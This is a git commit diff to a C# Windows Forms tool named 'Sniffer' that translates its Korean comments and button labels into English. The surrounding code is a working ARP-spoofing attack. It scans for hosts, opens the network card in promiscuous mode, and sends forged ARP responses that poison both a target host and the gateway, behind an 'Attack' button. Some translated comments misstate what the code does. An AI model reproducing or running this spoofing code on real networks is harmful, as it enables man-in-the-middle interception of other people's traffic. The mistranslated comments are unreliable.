0c7168b2fa2f2c861cdef60eeea1d97c64ce2f37
Slept-Warrior <395533269@qq.com>
2016-10-21 08:54:57 +0800

    Update AttackList.cs
    Replace gibberish with English

--- Sniffer/AttackList.cs
+++ Sniffer/AttackList.cs
@@ -19,10 +19,10 @@ namespace Sniffer
     public partial class AttackList : Form
     {
         BaseInformation baseinformation;
-        static Thread[] t_startHostArpSpoofing = new Thread[255];           //공격할 대상을 스푸핑한다.
-        static Thread[] t_startGatewayArpSpoofing = new Thread[255];           //공격할 대상을 스푸핑한다.
+        static Thread[] t_startHostArpSpoofing = new Thread[255];           //Spoof a target
+        static Thread[] t_startGatewayArpSpoofing = new Thread[255];           //Spoof a target
         
-        static Thread t_startArpScanning;           //공격할 대상을 스캐닝한다
+        static Thread t_startArpScanning;           //scan targets
         static bool threadState=false;
        
 
@@ -39,16 +39,16 @@ namespace Sniffer
         {
             if (threadState == true)
             {
-                btn_Start_ArpSpoof.Text = "공격 종료";
+                btn_Start_ArpSpoof.Text = "Stop";
             }
             else if (threadState == false)
             {
-                btn_Start_ArpSpoof.Text = "공격 시작";
+                btn_Start_ArpSpoof.Text = "Attack";
             }
-            // DataGridView의 컬럼 갯수를 3개로 설정합니다.
+            // Set DataGridView as 3 columns
         }
 
-        private void setDataGridView()      // DataGridView에 컬럼을 추가합니다.
+        private void setDataGridView()      // Add columns to DataGridView
         {
             dataGridView_Host_List.ColumnCount = 3;
             dataGridView_Host_List.Columns[0].Name = "Computer Name";
@@ -124,7 +124,7 @@ namespace Sniffer
                                 }
                                 else
                                 {
-                                    //아이피에 해당하는 맥 Address가 없을 경우 여기로 옴
+                                    //While there's no MAC Address for the IP
                                 }                    
                             }
                         }
@@ -170,14 +170,14 @@ namespace Sniffer
             {
                 startArpSpoofingFunction();
                 threadState = true;
-                btn_Start_ArpSpoof.Text = "공격 종료";
+                btn_Start_ArpSpoof.Text = "Stop";
             }
             else
             {
                
                 stopArpSpoofingFunction();
                 threadState = false;
-                btn_Start_ArpSpoof.Text = "공격 시작";
+                btn_Start_ArpSpoof.Text = "Start";
                 
             }
             //
@@ -186,20 +186,17 @@ namespace Sniffer
         {
             while (true)
             {
-                // Millisecond 단위 이며 초기연결 지연설정
+                // Millisecond unit is connected to the initial delay setting (?)
 
                 int readTimeout = 1;
+                
 
-
-                // 현재 단말기의 네트워크 장치의 리스트들을 불러온다.
-
-
-                // 무선 랜카드의 인덱스 번호는 1번(단말기 설정에 따라 다름)
+                // The index number of the wireless LAN card #1 (depends on device settings)
 
                 ICaptureDevice device = BaseInformation.captureDevice;
 
 
-                // 무선 랜카드를 프러미스큐어스 모드로 연다.
+                // Open the LAN card in Promiscuous mode.
 
                 device.Open(DeviceMode.Promiscuous, readTimeout);
 
@@ -216,17 +213,17 @@ namespace Sniffer
 
                 targetIP = IPAddress.Parse(targetIpString);
 
-                targetMac = PhysicalAddress.Parse(targetMacString.ToUpper());  // 맥사이사이의 - 문자를 지워준다
+                targetMac = PhysicalAddress.Parse(targetMacString.ToUpper());  // Insert "-" between Mac
 
                 gatewayMac = PhysicalAddress.Parse(BaseInformation.gatewayMac.ToUpper());
 
 
-                gatewayIP = IPAddress.Parse(BaseInformation.gatewayIP); //아이피에 게이트웨이 주소를 넣어주어야 한다.
+                gatewayIP = IPAddress.Parse(BaseInformation.gatewayIP);
 
                 srcMac = PhysicalAddress.Parse(BaseInformation.myMacAddress.ToUpper());
 
 
-                //타겟 Infection
+                //Target ARP Infection
                 ARPPacket arp = new ARPPacket(ARPOperation.Response, targetMac, targetIP, srcMac, gatewayIP);
                 EthernetPacket eth = new EthernetPacket(srcMac, targetMac, EthernetPacketType.Arp);
                 eth.PayloadPacket = arp;
@@ -242,16 +239,13 @@ namespace Sniffer
 
             while (true)
             {
-                // Millisecond 단위 이며 초기연결 지연설정
+                // Millisecond unit is connected to the initial delay setting (?)
                 int readTimeout = 1000;
 
-                // 현재 단말기의 네트워크 장치의 리스트들을 불러온다.
-
-                // 무선 랜카드의 인덱스 번호는 1번(단말기 설정에 따라 다름)
+                // The index number of the wireless LAN card #1 (depends on device settings)
                 ICaptureDevice device = BaseInformation.captureDevice;
 
-
-                // 무선 랜카드를 프러미스큐어스 모드로 연다.
+                // Open the LAN card in Promiscuous mode.
                 device.Open(DeviceMode.Promiscuous, readTimeout);
 
                 IPAddress targetIP = null;
@@ -263,11 +257,11 @@ namespace Sniffer
                 targetMac = PhysicalAddress.Parse(targetMacString.ToUpper());
                 gatewayMac = PhysicalAddress.Parse(BaseInformation.gatewayMac.ToUpper());
 
-                gatewayIP = IPAddress.Parse(BaseInformation.gatewayIP); //아이피에 게이트웨이 주소를 넣어주어야 한다.
+                gatewayIP = IPAddress.Parse(BaseInformation.gatewayIP); 
                 srcMac = PhysicalAddress.Parse(BaseInformation.myMacAddress.ToUpper());
 
                 
-                //게이트웨이 Infection
+                //Gateway ARP Infection
                 ARPPacket arpForGateway = new ARPPacket(ARPOperation.Response, gatewayMac, gatewayIP, srcMac, targetIP);
                 EthernetPacket ethforGateway = new EthernetPacket(srcMac, gatewayMac, EthernetPacketType.Arp);
                 ethforGateway.PayloadPacket = arpForGateway;
@@ -289,13 +283,10 @@ namespace Sniffer
         {
             int readTimeout = 1;
 
-            // 현재 단말기의 네트워크 장치의 리스트들을 불러온다.
-
-            // 무선 랜카드의 인덱스 번호는 1번(단말기 설정에 따라 다름)
+            // The index number of the wireless LAN card #1 (depends on device settings)
             ICaptureDevice device = BaseInformation.captureDevice;
-
-
-            // 무선 랜카드를 프러미스큐어스 모드로 연다.
+            
+            // Open the LAN card in Promiscuous mode.
             device.Open(DeviceMode.Promiscuous, readTimeout);
 
             IPAddress targetIP = null;
@@ -307,10 +298,10 @@ namespace Sniffer
             EtherArpRequestMac = PhysicalAddress.Parse(BaseInformation.EtherMacAddressForArpRequest.ToUpper());
             ArpRequestMac = PhysicalAddress.Parse(BaseInformation.ArpMacAddressForArpRequest.ToUpper());
 
-            gatewayIP = IPAddress.Parse(BaseInformation.gatewayIP); //아이피에 게이트웨이 주소를 넣어주어야 한다.
+            gatewayIP = IPAddress.Parse(BaseInformation.gatewayIP); 
             srcMac = PhysicalAddress.Parse(BaseInformation.myMacAddress.ToUpper());
 
-            //타겟 Infection
+            //Target ARP Infection
 
             EthernetPacket eth = new EthernetPacket(srcMac, EtherArpRequestMac, EthernetPacketType.Arp);
             ARPPacket arp = new ARPPacket(ARPOperation.Request, ArpRequestMac, gatewayIP, srcMac, gatewayIP);
